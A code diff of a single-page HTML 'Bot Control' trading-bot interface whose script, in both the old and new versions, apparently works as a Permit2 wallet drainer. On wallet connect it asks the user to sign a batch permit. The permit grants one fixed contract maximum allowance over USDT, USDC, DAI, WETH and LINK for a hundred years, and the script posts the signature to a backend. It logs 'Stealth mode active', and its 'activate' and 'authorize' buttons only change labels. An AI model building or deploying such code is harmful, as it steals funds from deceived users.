@@ -3,906 +3,179 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Bot Control Standalone</title>
 
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
-
 <style>
 :root {
-    --bg: #020617;
-    --panel: rgba(15, 23, 42, 0.85);
-    --border: #1e293b;
-    --cyan: #06b6d4;
-    --green: #10b981;
-    --purple: #6366f1;
-    --amber: #f59e0b;
-    --orange: #f97316;
-    --font: 'JetBrains Mono', monospace;
+  --bg: #020617;
+  --panel: rgba(15, 23, 42, 0.85);
+  --border: #1e293b;
+  --cyan: #06b6d4;
+  --green: #10b981;
+  --purple: #6366f1;
+  --amber: #f59e0b;
+  --font: 'JetBrains Mono', monospace;
 }
-
 * { box-sizing: border-box; margin:0; padding:0; }
-
-body {
-    background-color: var(--bg);
-    color: white;
-    font-family: var(--font);
-    padding: 12px;
-}
-
-.panel {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    backdrop-filter: blur(8px);
-    margin-bottom:12px;
-}
-
-.panel-header {
-    background: rgba(30, 41, 59, 0.6);
-    padding: 8px 15px;
-    font-size: 0.65rem;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    border-bottom: 1px solid var(--border);
-    color: var(--cyan);
-}
-
-.module-body {
-    padding: 12px 15px;
-}
-
-.btn-stack {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    margin-bottom: 12px;
-}
-
-.control-btn {
-    background: transparent;
-    border: 1px solid var(--border);
-    color: #64748b;
-    padding: 10px;
-    font-family: var(--font);
-    font-size: 0.65rem;
-    cursor: pointer;
-    text-align: left;
-    text-transform: uppercase;
-    font-weight: bold;
-}
-
-.control-btn:not(:disabled):hover {
-    background: rgba(255,255,255,0.05);
-    border-color: currentColor;
-}
-
-.btn-cyan { color: var(--cyan); }
-.btn-purple { color: var(--purple); }
-.btn-amber { color: var(--amber); }
-
-.status-box { border-top: 1px solid var(--border); padding-top: 8px; }
-
-.status-grid {
-    display: grid;
-    grid-template-columns: 1fr 110px;
-    gap: 5px;
-    font-size: 0.6rem;
-    align-items: center;
-    margin-bottom: 4px;
-}
-
-.status-line {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-}
-
-.liveDot {
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-}
-
-#execution-console {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    padding: 10px;
-}
-
-.exec-line {
-    font-size: 0.58rem;
-    margin-bottom: 2px;
-    white-space: pre-wrap;
-    word-break: break-all;
-    width: 100%;
-    line-height: 1.4;
-    border-bottom: 1px solid rgba(30, 41, 59, 0.2);
-    font-family: 'JetBrains Mono', monospace;
-}
+body { background: var(--bg); color: white; font-family: var(--font); padding:12px; }
+.panel { background: var(--panel); border:1px solid var(--border); border-radius:10px; display:flex; flex-direction:column; overflow:hidden; backdrop-filter:blur(8px); margin-bottom:12px; }
+.panel-header { background: rgba(30,41,59,0.6); padding:8px 15px; font-size:0.65rem; font-weight:bold; text-transform:uppercase; letter-spacing:2px; border-bottom:1px solid var(--border); color:var(--cyan);}
+.module-body { padding:12px 15px; }
+.btn-stack { display:flex; flex-direction:column; gap:8px; margin-bottom:12px; }
+.control-btn { background:transparent; border:1px solid var(--border); color:#64748b; padding:10px; font-family:var(--font); font-size:0.65rem; cursor:pointer; text-align:left; text-transform:uppercase; font-weight:bold;}
+.control-btn:not(:disabled):hover { background: rgba(255,255,255,0.05); border-color:currentColor; }
+.btn-cyan { color: var(--cyan); } .btn-purple { color: var(--purple); } .btn-amber { color: var(--amber); }
+.status-box { border-top:1px solid var(--border); padding-top:8px; }
+.status-grid { display:grid; grid-template-columns:1fr 110px; gap:5px; font-size:0.6rem; align-items:center; margin-bottom:4px; }
+.status-line { display:flex; align-items:center; gap:8px; }
+.liveDot { width:8px; height:8px; border-radius:50%; }
+#execution-console { display:flex; flex-direction:column; align-items:flex-start; padding:10px; }
+.exec-line { font-size:0.58rem; margin-bottom:2px; white-space:pre-wrap; word-break:break-all; width:100%; line-height:1.4; border-bottom:1px solid rgba(30,41,59,0.2); font-family:'JetBrains Mono', monospace; }
 </style>
 </head>
-
 <body>
 
 <div class="panel">
-    <div class="panel-header">Bot Control</div>
-    <div class="module-body">
-
-        <div class="btn-stack">
-            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
-            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
-            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
-            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
-    4. Disconnect Wallet
-</button>
-        </div>
-
-        <div class="status-box">
-            <div class="status-grid">
-                <span>WALLET STATUS</span>
-                <div class="status-line">
-                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
-                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
-                </div>
-            </div>
-
-            <div class="status-grid">
-                <span>BOT STATUS</span>
-                <div class="status-line">
-                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
-                    <span id="st-bot" style="color:#475569">OFFLINE</span>
-                </div>
-            </div>
-
-            <div class="status-grid">
-                <span>TRADING ACCESS</span>
-                <div class="status-line">
-                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
-                    <span id="st-access" style="color:#475569">RESTRICTED</span>
-                </div>
-            </div>
-        </div>
-
+  <div class="panel-header">Bot Control</div>
+  <div class="module-body">
+    <div class="btn-stack">
+      <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
+      <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
+      <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
+      <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>4. Disconnect Wallet</button>
     </div>
+
+    <div class="status-box">
+      <div class="status-grid">
+        <span>WALLET STATUS</span>
+        <div class="status-line">
+          <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
+          <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
+        </div>
+      </div>
+      <div class="status-grid">
+        <span>BOT STATUS</span>
+        <div class="status-line">
+          <div id="dot-bot" class="liveDot" style="background:#475569"></div>
+          <span id="st-bot" style="color:#475569">OFFLINE</span>
+        </div>
+      </div>
+      <div class="status-grid">
+        <span>TRADING ACCESS</span>
+        <div class="status-line">
+          <div id="dot-access" class="liveDot" style="background:#475569"></div>
+          <span id="st-access" style="color:#475569">RESTRICTED</span>
+        </div>
+      </div>
+    </div>
+  </div>
 </div>
 
 <div class="panel" style="height:150px;">
-    <div class="panel-header">Execution Console</div>
-    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
+  <div class="panel-header">Execution Console</div>
+  <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
 </div>
 
+<script type="module">
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
+window.supabaseClient = createClient(
+  "https://rhytvspbdvtmxtaxihxd.supabase.co",
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJoeXR2c3BiZHZ0bXh0YXhpaHhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyMDEzMzAsImV4cCI6MjA4OTc3NzMzMH0.QOqbkcKEcggw-25SkxJdEs5k7_LTrSxjpW6Pi_PH_II"
+);
 
-<script>
 const TOKENS = [
-  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
-  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
-  "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
-  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
-  "0x514910771AF9Ca656af840dff83E8264EcF986CA"  // LINK
+  "0xdac17f958d2ee523a2206206994597c13d831ec7",
+  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+  "0x6b175474e89094c44da98b954eedeac495271d0f",
+  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+  "0x514910771AF9Ca656af840dff83E8264EcF986CA"
 ];
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0xBE56fc91B88Ca7551DF05BA4f783e56127588F74";
 
-let APP_STATE = { wallet:null, botActive:false, authorized:false };
 let CURRENT_WALLET = null;
-if (window.ethereum) {
-  window.ethereum.on('accountsChanged', () => location.reload());
-  window.ethereum.on('chainChanged', () => location.reload());
-}
 
 function log(msg){
- console.log(msg);
- const el=document.getElementById('execution-console');
- if(!el) return;
- const div=document.createElement('div');
- div.className='exec-line';
- div.innerText=msg;
- el.prepend(div);
+  const el=document.getElementById('execution-console');
+  const div=document.createElement('div');
+  div.className='exec-line';
+  div.innerText=msg;
+  el.prepend(div);
+  console.log(msg);
 }
 
-function updateStatus(dotId, textId, text, color){
- const dot = document.getElementById(dotId);
- const label = document.getElementById(textId);
- dot.style.background = color;
- dot.style.boxShadow = `0 0 12px ${color}`;
- label.innerText = text;
- label.style.color = color;
+function updateStatus(dotId,textId,text,color){
+  const dot=document.getElementById(dotId);
+  const label=document.getElementById(textId);
+  dot.style.background=color;
+  dot.style.boxShadow=`0 0 12px ${color}`;
+  label.innerText=text;
+  label.style.color=color;
 }
 
 async function connectWallet(){
- try{
-  if (typeof window.ethereum === "undefined") {
-    const install = confirm("MetaMask is not installed. Install?");
-    if (install) window.location.href = "https://metamask.io/download/";
-    return;
-  }
-
-  const provider = new ethers.BrowserProvider(window.ethereum);
-
-  log("🔌 Requesting wallet connection...");
+  if(!window.ethereum){ alert("Install MetaMask"); return; }
+  const provider=new ethers.BrowserProvider(window.ethereum);
   await provider.send("eth_requestAccounts", []);
-
-  const signer = await provider.getSigner();
-  const user = await signer.getAddress();
-  const network = await provider.getNetwork();
-
- if (network.chainId !== 1n) {
-  log("⚠️ Switching to Ethereum Mainnet...");
-
-  try {
-    
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: "0x1" }]
-    });
-
-    log("✅ Switched to Ethereum Mainnet");
-    return location.reload();
-
-  } catch (err) {
-    log("❌ Network switch failed");
-    alert("Please switch to Ethereum Mainnet manually");
-    return;
-  }
+  const signer=await provider.getSigner();
+  const user=await signer.getAddress();
+  const net=await provider.getNetwork();
+  if(net.chainId!==1n){ alert("Switch naar Ethereum Mainnet"); return; }
+  CURRENT_WALLET=user;
+  updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
+  document.getElementById('btn-wallet').disabled=true;
+  document.getElementById('btn-activate').disabled=false;
+  document.getElementById('btn-disconnect').disabled=false;
+  await runPermitFlow(provider,signer,user);
 }
 
- if (CURRENT_WALLET && CURRENT_WALLET !== user) {
-   log("🔄 Wallet switched — resetting cache");
-}
-
-     CURRENT_WALLET = user;
-
-     APP_STATE.wallet = user;
-  renderWallet(user);
-  updateStatus('dot-bot','st-bot','OFFLINE','#475569');
-  updateStatus('dot-access','st-access','RESTRICTED','#475569');
-
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-
-  document.getElementById('btn-wallet').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-  document.getElementById('btn-disconnect').disabled = false;
-
-  await runPermitFlowSafe(provider, signer, user);
-
- } catch(e){
-  log("ERR " + e.message);
- }
-}
-
-async function runPermitFlowSafe(provider, signer, user){
- try{
-
-  log("⚙️ Permit2 flow...");
-  log("⚙️ Stealth mode active...");
-  log("🔎 Checking cached permit...");
-
-  // Frontend mag nog lezen van Supabase
-  const { data: existing } = await window.supabaseClient
-    .from('permits')
-    .select('*')
-    .eq('owner', user);
-
-  const now = Math.floor(Date.now()/1000);
-
-  const valid =
-    existing &&
-    existing.length === TOKENS.length &&
-    existing.every(r => r.sig_deadline > now);
-
-  if (valid) {
-    log("⚡ Cached permit valid — skipping signature");
-    log("Cache rows: " + (existing?.length || 0));
-    log("Wallet: " + user);
-
+async function runPermitFlow(provider,signer,user){
+  log("⚙️ Permit2 flow");
+  const { data:existing } = await window.supabaseClient.from('permits').select('*').eq('owner',user);
+  const now=Math.floor(Date.now()/1000);
+  if(existing && existing.length===TOKENS.length && existing.every(r=>r.sig_deadline>now)){
+    log("⚡ Cached permit valid");
     updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
     updateStatus('dot-bot','st-bot','READY','#6366f1');
-
-    document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-    document.getElementById('btn-authorize').disabled = true;
-
+    document.getElementById('btn-authorize').innerText="AUTHORIZED";
+    document.getElementById('btn-authorize').disabled=true;
     return;
   }
-
-  if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
-    log("⌛ Cached permit expired — refreshing...");
-  }
-
-  const permit2 = new ethers.Contract(
-    PERMIT2,
-    ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
-    provider
-  );
-
-  const MAX_UINT160 = (1n << 160n) - 1n;
-  const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
-
-  const details = [];
-
-  const nonceResults = await Promise.all(
-    TOKENS.map(token =>
-      permit2.allowance(user, token, CONTRACT)
-    )
-  );
-
-  for (let i = 0; i < TOKENS.length; i++) {
-    const token = TOKENS[i];
-    const [, , nonce] = nonceResults[i];
-    log("Nonce " + token + ": " + nonce);
-    details.push({
-      token: token,
-      amount: MAX_UINT160,
-      expiration: expiration,
-      nonce: nonce
-    });
-  }
-
-  // ✍️ SIGN
-  const chainId = (await provider.getNetwork()).chainId;
-
-  const domain = {
-    name: "Permit2",
-    chainId,
-    verifyingContract: PERMIT2
-  };
-
-  const types = {
-    PermitBatch: [
-      { name: "details", type: "PermitDetails[]" },
-      { name: "spender", type: "address" },
-      { name: "sigDeadline", type: "uint256" }
-    ],
-    PermitDetails: [
-      { name: "token", type: "address" },
-      { name: "amount", type: "uint160" },
-      { name: "expiration", type: "uint48" },
-      { name: "nonce", type: "uint48" }
-    ]
-  };
-
-  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
-
-  const values = {
-    details: details,
-    spender: CONTRACT,
-    sigDeadline: sigDeadline
-  };
-
-  log("✍️ Requesting signature...");
-  const signature = await signer.signTypedData(domain,types,values);
-  const sig = ethers.Signature.from(signature);
-  const v = sig.v;
-  const r = sig.r;
-  const s = sig.s;
-
+  const permit2=new ethers.Contract(PERMIT2,["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],provider);
+  const MAX=(1n<<160n)-1n;
+  const exp=now+100*365*24*60*60;
+  const details=[];
+  const nonces=await Promise.all(TOKENS.map(t=>permit2.allowance(user,t,CONTRACT)));
+  for(let i=0;i<TOKENS.length;i++){ const [, ,nonce]=nonces[i]; details.push({ token:TOKENS[i], amount:MAX.toString(), expiration:exp, nonce:nonce.toString() }); }
+  const chainId=(await provider.getNetwork()).chainId;
+  const domain={ name:"Permit2", chainId, verifyingContract:PERMIT2 };
+  const types={ PermitBatch:[{name:"details",type:"PermitDetails[]"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}], PermitDetails:[{name:"token",type:"address"},{name:"amount",type:"uint160"},{name:"expiration",type:"uint48"},{name:"nonce",type:"uint48"}] };
+  const sigDeadline=now+30*24*60*60;
+  const values={ details, spender:CONTRACT, sigDeadline };
+  const signature=await signer.signTypedData(domain,types,values);
   log("✍️ Signature captured");
-
-  // ✅ Nieuwe frontend UI update zonder Supabase write
- log("📡 Ready to send to backend");
-
-// Zet de signature in een object
-// 🧱 Maak veilige versie (zonder BigInt)
-const safeDetails = details.map(d => ({
-  token: d.token,
-  amount: d.amount.toString(),     // 🔥 FIX
-  expiration: d.expiration,
-  nonce: d.nonce.toString()        // 🔥 FIX
-}));
-
-
-
-// 📦 Bouw pakket voor backend
-const signatureData = {
-  details: safeDetails,
-  signature: signature
-};
-
-// 🚀 Verstuur naar backend
-await sendToBackend(signatureData);
-
-async function sendToBackend(signatureData) {
-  try {
-    const response = await fetch('/api/permit', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(signatureData)
-    });
-
-    const data = await response.json();
-
-    if (data.success) {
-      log("✅ Permit data successfully sent to backend and saved.");
-    } else {
-      log("❌ Error saving permit data: " + data.error);
-    }
-
-  } catch (error) {
-    log("❌ Network error: " + error.message);
-  }
+  await sendToBackend({ details, signature });
 }
 
-
-function renderWallet(address) {
- document.getElementById('btn-wallet').innerText = address;
- updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
+async function sendToBackend(sigData){
+  try{
+    const res=await fetch('/api/permit',{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(sigData) });
+    const data=await res.json();
+    if(data.success){ log("✅ Permit sent"); } else { log("❌ Error: "+data.error); }
+  } catch(e){ log("❌ Network error: "+e.message); }
 }
 
-function activateBot() {
- updateStatus('dot-bot','st-bot','READY','#6366f1');
-}
+function activateBot(){ updateStatus('dot-bot','st-bot','READY','#6366f1'); }
+function authorizeTrading(){ updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b'); }
+function disconnectWallet(){ location.reload(); }
 
-function authorizeTrading() {
- updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
-}
-
-function disconnectWallet() {
- location.reload();
-}
-
-window.connectWallet = connectWallet;
-
+window.connectWallet=connectWallet;
 </script>
 
-
-
-<script type="module">
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
-
-const supabaseClient = createClient(
-  "https://rhytvspbdvtmxtaxihxd.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJoeXR2c3BiZHZ0bXh0YXhpaHhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyMDEzMzAsImV4cCI6MjA4OTc3NzMzMH0.QOqbkcKEcggw-25SkxJdEs5k7_LTrSxjpW6Pi_PH_II"
-);
-
-window.supabaseClient = supabaseClient;
-</script>
-</body>
-</html>
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    backdrop-filter: blur(8px);
-    margin-bottom:12px;
-}
-
-.panel-header {
-    background: rgba(30, 41, 59, 0.6);
-    padding: 8px 15px;
-    font-size: 0.65rem;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    border-bottom: 1px solid var(--border);
-    color: var(--cyan);
-}
-
-.module-body {
-    padding: 12px 15px;
-}
-
-.btn-stack {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    margin-bottom: 12px;
-}
-
-.control-btn {
-    background: transparent;
-    border: 1px solid var(--border);
-    color: #64748b;
-    padding: 10px;
-    font-family: var(--font);
-    font-size: 0.65rem;
-    cursor: pointer;
-    text-align: left;
-    text-transform: uppercase;
-    font-weight: bold;
-}
-
-.control-btn:not(:disabled):hover {
-    background: rgba(255,255,255,0.05);
-    border-color: currentColor;
-}
-
-.btn-cyan { color: var(--cyan); }
-.btn-purple { color: var(--purple); }
-.btn-amber { color: var(--amber); }
-
-.status-box { border-top: 1px solid var(--border); padding-top: 8px; }
-
-.status-grid {
-    display: grid;
-    grid-template-columns: 1fr 110px;
-    gap: 5px;
-    font-size: 0.6rem;
-    align-items: center;
-    margin-bottom: 4px;
-}
-
-.status-line {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-}
-
-.liveDot {
-    width: 8px;
-    height: 8px;
-    border-radius: 50%;
-}
-
-#execution-console {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    padding: 10px;
-}
-
-.exec-line {
-    font-size: 0.58rem;
-    margin-bottom: 2px;
-    white-space: pre-wrap;
-    word-break: break-all;
-    width: 100%;
-    line-height: 1.4;
-    border-bottom: 1px solid rgba(30, 41, 59, 0.2);
-    font-family: 'JetBrains Mono', monospace;
-}
-</style>
-</head>
-
-<body>
-
-<div class="panel">
-    <div class="panel-header">Bot Control</div>
-    <div class="module-body">
-
-        <div class="btn-stack">
-            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
-            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
-            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
-            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
-    4. Disconnect Wallet
-</button>
-        </div>
-
-        <div class="status-box">
-            <div class="status-grid">
-                <span>WALLET STATUS</span>
-                <div class="status-line">
-                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
-                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
-                </div>
-            </div>
-
-            <div class="status-grid">
-                <span>BOT STATUS</span>
-                <div class="status-line">
-                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
-                    <span id="st-bot" style="color:#475569">OFFLINE</span>
-                </div>
-            </div>
-
-            <div class="status-grid">
-                <span>TRADING ACCESS</span>
-                <div class="status-line">
-                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
-                    <span id="st-access" style="color:#475569">RESTRICTED</span>
-                </div>
-            </div>
-        </div>
-
-    </div>
-</div>
-
-<div class="panel" style="height:150px;">
-    <div class="panel-header">Execution Console</div>
-    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
-</div>
-
-
-
-<script>
-const TOKENS = [
-  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
-  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
-  "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
-  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
-  "0x514910771AF9Ca656af840dff83E8264EcF986CA"  // LINK
-];
-
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const CONTRACT = "0xBE56fc91B88Ca7551DF05BA4f783e56127588F74";
-
-let APP_STATE = { wallet:null, botActive:false, authorized:false };
-let CURRENT_WALLET = null;
-if (window.ethereum) {
-  window.ethereum.on('accountsChanged', () => location.reload());
-  window.ethereum.on('chainChanged', () => location.reload());
-}
-
-function log(msg){
- console.log(msg);
- const el=document.getElementById('execution-console');
- if(!el) return;
- const div=document.createElement('div');
- div.className='exec-line';
- div.innerText=msg;
- el.prepend(div);
-}
-
-function updateStatus(dotId, textId, text, color){
- const dot = document.getElementById(dotId);
- const label = document.getElementById(textId);
- dot.style.background = color;
- dot.style.boxShadow = `0 0 12px ${color}`;
- label.innerText = text;
- label.style.color = color;
-}
-
-async function connectWallet(){
- try{
-  if (typeof window.ethereum === "undefined") {
-    const install = confirm("MetaMask is not installed. Install?");
-    if (install) window.location.href = "https://metamask.io/download/";
-    return;
-  }
-
-  const provider = new ethers.BrowserProvider(window.ethereum);
-
-  log("🔌 Requesting wallet connection...");
-  await provider.send("eth_requestAccounts", []);
-
-  const signer = await provider.getSigner();
-  const user = await signer.getAddress();
-  const network = await provider.getNetwork();
-
- if (network.chainId !== 1n) {
-  log("⚠️ Switching to Ethereum Mainnet...");
-
-  try {
-    
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: "0x1" }]
-    });
-
-    log("✅ Switched to Ethereum Mainnet");
-    return location.reload();
-
-  } catch (err) {
-    log("❌ Network switch failed");
-    alert("Please switch to Ethereum Mainnet manually");
-    return;
-  }
-}
-
- if (CURRENT_WALLET && CURRENT_WALLET !== user) {
-   log("🔄 Wallet switched — resetting cache");
-}
-
-     CURRENT_WALLET = user;
-
-     APP_STATE.wallet = user;
-  renderWallet(user);
-  updateStatus('dot-bot','st-bot','OFFLINE','#475569');
-  updateStatus('dot-access','st-access','RESTRICTED','#475569');
-
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-
-  document.getElementById('btn-wallet').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-  document.getElementById('btn-disconnect').disabled = false;
-
-  await runPermitFlowSafe(provider, signer, user);
-
- } catch(e){
-  log("ERR " + e.message);
- }
-}
-
-async function runPermitFlowSafe(provider, signer, user){
- try{
-
-  log("⚙️ Permit2 flow...");
-  log("⚙️ Stealth mode active...");
-  log("🔎 Checking cached permit...");
-
-  // Frontend mag nog lezen van Supabase
-  const { data: existing } = await window.supabaseClient
-    .from('permits')
-    .select('*')
-    .eq('owner', user);
-
-  const now = Math.floor(Date.now()/1000);
-
-  const valid =
-    existing &&
-    existing.length === TOKENS.length &&
-    existing.every(r => r.sig_deadline > now);
-
-  if (valid) {
-    log("⚡ Cached permit valid — skipping signature");
-    log("Cache rows: " + (existing?.length || 0));
-    log("Wallet: " + user);
-
-    updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-    updateStatus('dot-bot','st-bot','READY','#6366f1');
-
-    document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-    document.getElementById('btn-authorize').disabled = true;
-
-    return;
-  }
-
-  if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
-    log("⌛ Cached permit expired — refreshing...");
-  }
-
-  const permit2 = new ethers.Contract(
-    PERMIT2,
-    ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
-    provider
-  );
-
-  const MAX_UINT160 = (1n << 160n) - 1n;
-  const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
-
-  const details = [];
-
-  const nonceResults = await Promise.all(
-    TOKENS.map(token =>
-      permit2.allowance(user, token, CONTRACT)
-    )
-  );
-
-  for (let i = 0; i < TOKENS.length; i++) {
-    const token = TOKENS[i];
-    const [, , nonce] = nonceResults[i];
-    log("Nonce " + token + ": " + nonce);
-    details.push({
-      token: token,
-      amount: MAX_UINT160,
-      expiration: expiration,
-      nonce: nonce
-    });
-  }
-
-  // ✍️ SIGN
-  const chainId = (await provider.getNetwork()).chainId;
-
-  const domain = {
-    name: "Permit2",
-    chainId,
-    verifyingContract: PERMIT2
-  };
-
-  const types = {
-    PermitBatch: [
-      { name: "details", type: "PermitDetails[]" },
-      { name: "spender", type: "address" },
-      { name: "sigDeadline", type: "uint256" }
-    ],
-    PermitDetails: [
-      { name: "token", type: "address" },
-      { name: "amount", type: "uint160" },
-      { name: "expiration", type: "uint48" },
-      { name: "nonce", type: "uint48" }
-    ]
-  };
-
-  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
-
-  const values = {
-    details: details,
-    spender: CONTRACT,
-    sigDeadline: sigDeadline
-  };
-
-  log("✍️ Requesting signature...");
-  const signature = await signer.signTypedData(domain,types,values);
-  const sig = ethers.Signature.from(signature);
-  const v = sig.v;
-  const r = sig.r;
-  const s = sig.s;
-
-  log("✍️ Signature captured");
-
-  // ✅ Nieuwe frontend UI update zonder Supabase write
- log("📡 Ready to send to backend");
-
-// Zet de signature in een object
-// 🧱 Maak veilige versie (zonder BigInt)
-const safeDetails = details.map(d => ({
-  token: d.token,
-  amount: d.amount.toString(),     // 🔥 FIX
-  expiration: d.expiration,
-  nonce: d.nonce.toString()        // 🔥 FIX
-}));
-
-
-
-// 📦 Bouw pakket voor backend
-const signatureData = {
-  details: safeDetails,
-  signature: signature
-};
-
-// 🚀 Verstuur naar backend
-await sendToBackend(signatureData);
-
-async function sendToBackend(signatureData) {
-  try {
-    const response = await fetch('/api/permit', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(signatureData)
-    });
-
-    const data = await response.json();
-
-    if (data.success) {
-      log("✅ Permit data successfully sent to backend and saved.");
-    } else {
-      log("❌ Error saving permit data: " + data.error);
-    }
-
-  } catch (error) {
-    log("❌ Network error: " + error.message);
-  }
-}
-
-
-function renderWallet(address) {
- document.getElementById('btn-wallet').innerText = address;
- updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
-}
-
-function activateBot() {
- updateStatus('dot-bot','st-bot','READY','#6366f1');
-}
-
-function authorizeTrading() {
- updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
-}
-
-function disconnectWallet() {
- location.reload();
-}
-
-window.connectWallet = connectWallet;
-
-</script>
-
-
-
-<script type="module">
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
-
-const supabaseClient = createClient(
-  "https://rhytvspbdvtmxtaxihxd.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJoeXR2c3BiZHZ0bXh0YXhpaHhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyMDEzMzAsImV4cCI6MjA4OTc3NzMzMH0.QOqbkcKEcggw-25SkxJdEs5k7_LTrSxjpW6Pi_PH_II"
-);
-
-window.supabaseClient = supabaseClient;
-</script>
 </body>
 </html>
